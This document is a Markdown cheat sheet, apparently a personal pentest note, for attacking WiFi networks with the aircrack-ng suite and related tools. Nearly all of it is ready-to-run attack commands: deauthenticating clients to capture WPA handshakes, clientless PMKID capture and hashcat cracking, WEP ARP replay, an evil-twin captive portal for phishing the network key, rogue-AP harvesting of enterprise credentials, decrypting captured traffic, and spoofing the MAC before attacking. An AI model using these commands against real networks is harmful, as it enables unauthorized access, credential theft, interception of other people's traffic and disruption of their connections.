# 📡 Wireless Testing


# Aircrack-ng — WiFi Attack Suite

> [!abstract] TL;DR
> Suite: `airmon-ng` (monitor mode) → `airodump-ng` (capture) →
> `aireplay-ng` (inject/deauth) → `aircrack-ng` (crack) → `airbase-ng` (evil twin).

---

## 0. Prereqs

```bash
iw list                          # check card supports monitor mode + injection
airmon-ng check kill             # kill NetworkManager/wpa_supplicant interfering procs
airmon-ng start wlan0            # → wlan0mon
iwconfig                         # verify Mode:Monitor
```

> [!tip] Card support
> Atheros AR9271 / Realtek RTL8812AU are the classic reliable chipsets for
> monitor + injection. Check `iw list` output for "monitor" and "AP" modes.

---

## 1. Recon — airodump-ng

```bash
airodump-ng wlan0mon                          # survey all APs
airodump-ng --band abg wlan0mon               # 2.4+5GHz
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
#   -c channel · --bssid filter AP · -w write capture (cap/cap.csv/cap.kismet)
```

Output columns:
- **BSSID** — AP MAC · **PWR** — signal · **CH** · **ENC** — WPA2/WPA3/OPN
- **ESSID** — network name · **STATION** — client MACs below the AP

---

## 2. WPA/WPA2 Handshake Capture

```bash
# Terminal 1 — capture on target channel, wait for handshake:
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# Watch top-right: "WPA handshake: AA:BB:CC:DD:EE:FF" when captured

# Terminal 2 — force it: deauth a client
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
#   -0 deauth · 5 count · -a AP · -c client (omit -c = broadcast deauth, noisier)
```

Handshake-less options:
- **PMF (802.11w) protected networks:** deauth won't work → wait for a client
  to (re)connect naturally, or go for SAE/WPA3 downgrade quirks
- Capture PMKID instead (clientless):

```bash
# PMKID attack (clientless WPA-PSK):
hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 dump.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt
```

---

## 3. Cracking — aircrack-ng

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF cap-01.cap

# with rules for candidate mangling:
aircrack-ng -w wordlist.txt -r /usr/share/hashcat/rules/best64.rule -b <bssid> cap-01.cap
```

> [!tip] Prefer hashcat
> For real throughput convert to hashcat format and GPU-crack:
> ```bash
> hcxpcapngtool -o hash.22000 cap-01.cap
> hashcat -m 22000 hash.22000 rockyou.txt
> ```
> aircrack-ng CPU cracking is fine for small lists / CTFs.

---

## 4. WEP (legacy — quick kill)

```bash
airodump-ng -c 6 --bssid <bssid> -w wepcap wlan0mon
aireplay-ng -3 -b <bssid> -h <your_spoofed_mac> wlan0mon   # ARP replay → IVs
aircrack-ng -b <bssid> wepcap.cap                          # ~40-80k IVs for 64-bit, 20k+
aireplay-ng -0 1 -a <bssid> -h <mac> wlan0mon              # kick a client to generate ARP traffic
```

---

## 5. Evil Twin / AP — airbase-ng

```bash
airbase-ng -a AA:BB:CC:DD:EE:FF --essid "CoffeeShop" -c 6 wlan0mon
# hostapd is the better real AP daemon; airbase-ng for quick decoy/CaptivePortal tests
```

WPA handshake capture evil-twin flow (captive portal phishing):
```bash
# 1) airbase-ng clone AP
# 2) dnsmasq + fake captive portal page (flask/simple httpd)
# 3) iptables redirect port 80/443 to portal
# 4) harvest PSK, verify against real AP handshake:
aircrack-ng -w harvested.txt -b <real_bssid> real-handshake.cap
```

---

## 6. WPA Enterprise (WPA2-EAP) Notes

```bash
# capture the exchange — crack user password offline:
airodump-ng -c 6 --bssid <bssid> -w ent wlan0mon
aircrack-ng -w rockyou.txt ent.cap              # -E ESSID to help the KDF
# EAPOL-MGT crack format: hashcat -m 22000 works for PMKID; enterprise =
# MSCHAPv2 (asleap) or TTLS/PAP harvesting via evil twin + RADIUS (hostapd-mana / eaphammer)
```

Tools: **eaphammer**, **hostapd-mana** — rogue AP that harvests enterprise creds.

---

## 7. Useful Extras

```bash
airdecap-ng -e "SSID" -p <password> cap-01.cap   # decrypt captured traffic post-crack
airdecap-ng -w <wepkey> wepcap.cap               # WEP decrypt
airmon-ng check                                   # find processes jamming monitor mode
wash -i wlan0mon                                  # WPS-enabled APs (then reaver/bully)
sudo macchanger -r wlan0                          # randomize MAC before attacking
```

---

## 8. Workflow Card

> [!summary] Standard WPA2 flow
> 1. `airmon-ng start wlan0`
> 2. `airodump-ng wlan0mon` — pick target
> 3. `airodump-ng -c X --bssid B -w cap wlan0mon`
> 4. `aireplay-ng -0 5 -a B -c C wlan0mon` (or PMKID via hcxdumptool)
> 5. `aircrack-ng -w wordlist -b B cap-01.cap` (or hashcat -m 22000)
> 6. `airdecap-ng` to read the traffic

Related: [[Nmap Guide]] · [[Metasploit Framework]]
